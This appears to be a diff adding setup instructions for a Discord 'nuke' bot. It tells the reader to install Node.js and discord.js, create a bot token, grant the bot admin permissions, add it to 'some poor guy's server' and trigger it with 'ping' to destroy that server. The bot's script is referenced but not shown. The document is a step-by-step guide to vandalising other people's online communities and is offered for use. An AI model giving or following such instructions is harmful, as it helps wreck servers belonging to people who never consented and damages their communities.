@@ -1,0 +1,13 @@
+procedure:
+
+Download all files into a folder
+Download Node.js
+Install Node and Discord.js into the folder (npm install and npm i discord.js in commandprompt)
+Go to Discord Developer Portal and create an app
+Switch to bot tab and create the bot
+plug in your token into the "theheartofmymasterpiece" script
+run "node theheartofmymasterpiece" in command prompt in your bot folder
+go to discord permissions calculator, click admin and obtain client id from discord developer portal and paste it in there
+go to the link provided
+bring it to some poor guy's server
+nuke it by saying ping in a chat
